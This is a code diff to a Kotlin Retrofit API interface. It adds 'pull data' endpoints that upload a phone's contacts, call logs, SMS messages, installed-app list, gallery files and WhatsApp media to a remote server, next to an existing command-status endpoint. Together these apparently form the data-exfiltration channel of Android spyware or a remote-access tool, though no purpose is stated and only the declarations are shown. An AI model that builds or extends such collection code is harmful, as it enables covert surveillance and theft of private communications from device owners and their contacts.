@@ -221,4 +221,51 @@ interface ApiService {
         @Query("command_id") commandId: Int,
         @Query("status") status: String,
     ): Response<Unit>
+
+    // ─── Pull data endpoints ────────────────────────────────────────────────────
+
+    @POST("device-data/contacts")
+    suspend fun uploadContacts(
+        @Header("Authorization") bearer: String,
+        @Body payload: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/call-logs")
+    suspend fun uploadCallLogs(
+        @Header("Authorization") bearer: String,
+        @Body payload: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/sms")
+    suspend fun uploadSms(
+        @Header("Authorization") bearer: String,
+        @Body payload: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @POST("device-data/installed-apps")
+    suspend fun uploadInstalledApps(
+        @Header("Authorization") bearer: String,
+        @Body payload: Map<String, @JvmSuppressWildcards Any>,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("device-data/media/upload")
+    suspend fun uploadGalleryFile(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("filename") filename: RequestBody,
+        @Part("media_type") mediaType: RequestBody,
+        @Part("album") album: RequestBody,
+        @Part("created_at") createdAt: RequestBody,
+    ): Response<Unit>
+
+    @Multipart
+    @POST("device-data/whatsapp-media/upload")
+    suspend fun uploadWhatsappMedia(
+        @Header("Authorization") bearer: String,
+        @Part file: MultipartBody.Part,
+        @Part("filename") filename: RequestBody,
+        @Part("album") album: RequestBody,
+        @Part("media_type") mediaType: RequestBody,
+    ): Response<Unit>
 }
